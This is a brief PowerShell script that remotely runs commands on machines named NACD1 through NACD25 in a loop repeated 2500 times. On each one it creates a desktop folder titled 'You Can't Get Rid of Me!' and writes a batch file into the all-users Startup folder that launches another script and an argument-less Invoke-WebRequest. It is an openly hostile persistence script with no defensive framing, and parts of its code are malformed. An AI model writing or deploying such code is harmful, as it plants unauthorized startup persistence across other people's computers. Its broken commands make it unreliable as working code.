#Will be in C: 


function runOn($tar){

   Invoke-Command -ComputerName $tar -ScriptBlock {



New-Item "c:\users\public\Desktop\You Can't Get Rid of Me!" -ItemType Directory


echo powershell.exe -Command { start-job -filepath 'C:\****\NSRunAll.ps1' & Invoke-WebRequest } > "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\DuckInitiator.bat"

  }
 
 }
 
for ($n0um = 1 ; $n0um -le 2500 ; $n0um++){
for ($num = 1 ; $num -le 25 ; $num++){ 
   Write-Host "NACD$num"
 
   runOn "NACD$num"
 
     
 }
}